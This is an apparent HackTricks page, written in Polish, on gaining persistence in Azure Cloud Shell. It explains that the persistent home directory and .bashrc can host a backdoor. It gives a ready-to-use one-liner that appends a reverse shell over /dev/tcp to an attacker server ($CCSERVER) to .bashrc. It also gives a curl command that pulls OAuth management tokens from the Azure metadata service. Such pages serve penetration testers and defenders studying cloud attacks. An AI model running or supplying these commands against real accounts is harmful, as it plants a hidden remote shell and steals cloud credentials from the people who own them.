# Az - Cloud Shell Persistence

{{#include ../../../banners/hacktricks-training.md}}

## Cloud Shell Persistence

Azure Cloud Shell oferuje dostęp do wiersza poleceń w celu zarządzania zasobami Azure z persistent storage i automatyczną autoryzacją. Atakujący mogą to wykorzystać, umieszczając backdoory w persistent home directory:

* **Persistent Storage**: Katalog domowy Azure Cloud Shell jest zamontowany na udostępnionym pliku Azure i pozostaje nienaruszony nawet po zakończeniu sesji.
* **Startup Scripts**: Pliki takie jak .bashrc wykonują się automatycznie na początku każdej sesji, co pozwala na persistent execution, gdy cloud shell się uruchamia.

Example backdoor in .bashrc:
```bash
echo '(nohup /usr/bin/env -i /bin/bash 2>/dev/null -norc -noprofile >& /dev/tcp/$CCSERVER/443 0>&1 &)' >> $HOME/.bashrc
```
Ten backdoor może wykonywać polecenia nawet 5 minut po zakończeniu sesji chmurowej przez użytkownika.

Dodatkowo zapytaj o usługi metadanych Azure w celu uzyskania szczegółów instancji i tokenów:
```bash
curl -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" -s
```
{{#include ../../../banners/hacktricks-training.md}}
